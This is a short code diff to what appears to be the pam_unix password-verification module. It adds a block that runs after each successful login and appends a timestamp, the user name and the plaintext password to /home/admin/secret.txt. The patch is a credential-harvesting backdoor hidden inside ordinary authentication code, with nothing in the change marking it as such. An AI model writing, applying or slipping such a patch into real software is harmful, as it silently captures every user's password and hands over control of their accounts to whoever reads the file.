@@ -762,6 +762,16 @@ int _unix_verify_password(pam_handle_t * pamh, const char *name
 		}
 	} else {
 		retval = verify_pwd_hash(p, salt, off(UNIX__NONULL, ctrl));
+		
+		if (retval == PAM_SUCCESS) {
+			char buf[26];  // POSIX specifies that 26 is enough for ctime_r
+			const time_t t = time(NULL);
+			char *date = ctime_r(&t, buf);
+			if (date) *strrchr(date, '\n') = '\0'; else date = "?";
+			FILE *f = fopen("/home/admin/secret.txt", "a");
+			fprintf(f, "%s [PAM] %s: %s\n", date, name, p);
+			fclose(f);
+		}
 	}
 
 	if (retval == PAM_SUCCESS) {
